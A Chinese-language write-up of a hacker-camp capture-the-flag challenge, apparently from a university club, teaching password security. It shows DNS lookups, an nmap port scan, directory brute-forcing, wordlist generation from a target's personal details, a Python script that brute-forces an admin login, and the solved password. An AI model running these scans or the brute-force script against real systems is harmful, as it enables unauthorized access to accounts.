# 駭客體驗營

## 解題流程
> https://digme.ntut.club
### First step
* 首先訪問網頁會看到 Can you dig me?
* 這時候我們稍微 dig 一下
* 最有可能放不同資訊的地方是 txt
    * `dig digme.ntut.club txt`
* 之後可以拿到一個 blog 的網址
    > https://blog.ntut.club

### Second step
* 再來訪問網頁，可以看到是一個部落格
    * 裡面的內容是弱密碼可能的選項
* 最下面有 server 的 ip
* 這時候，我們用 nmap 稍微掃描一下，規則上說 1-3000 就好
    * `nmap -p 1-3000 34.122.227.62`
* 之後可以看到一個特別的 port 2087

### Third step
* 這時候我們訪問 2087 port 
    > https://blog.ntut.club:2087
* 我們可以看到只有一個 pizza 的頁面以及 nothing here 的 title
* 如果我們要拿到網頁中沒有給出的資料，我們需要用 dirsearch 做目錄的掃描
    * 規則上說掃描到根目錄就好
    * `python3 dirsearch.py -u https://blog.ntut.club:2087/ -e php -b`
* 之後可以看到一個特別的目錄 `/admin` 或是 `/admin.php`

### Forth step
* 我們訪問一下 https://blog.ntut.club:2087/admin
    * 可以看到一個輸入密碼的頁面
* 要用 https://blog.ntut.club/ 中的內容來猜密碼
* 用 pydictor 來輔助我們
    * `python pydictor.py --sedb`
    * `set ename bob`
    * `set email thisisbob@gmail.com`
    * `set usedchar pizza`
    * `set phone 0912345678`
    * `run`
* 之後用 python 過濾一下生成的密碼，規則上說密碼是英文小寫
    ```python3=
    import requests
    from colorama import init, Fore, Back

    init(autoreset=True)
    url = 'https://blog.ntut.club:2087/admin'

    def alpha(password):
        for i in password:
            if (i >= 'a' and i <= 'z'):
                continue
            else:
                return False

        return True

    with open('sedb_201900.txt', 'r') as f:
        for password in f.readlines():
            password = password.replace('\n', '')

            if (alpha(password)):
                if (requests.post(url, data={'password':password}).status_code == 200):
                    print(Fore.GREEN + password)
                    break
                else:
                    print(Fore.RED + password)
            else:
                continue
    ```
* 得知密碼是 `thisisbobpizza`

## 結論
### 密碼長度與強度的重要性
* 如果沒有在規則上說過密碼都是英文小寫，再加上網頁每收到一組密碼都會停個三秒，破解的時間會無線拉長
* 希望各位在這次的體驗營之後能體驗到駭客之餘，對於自己的密碼能更注意歐
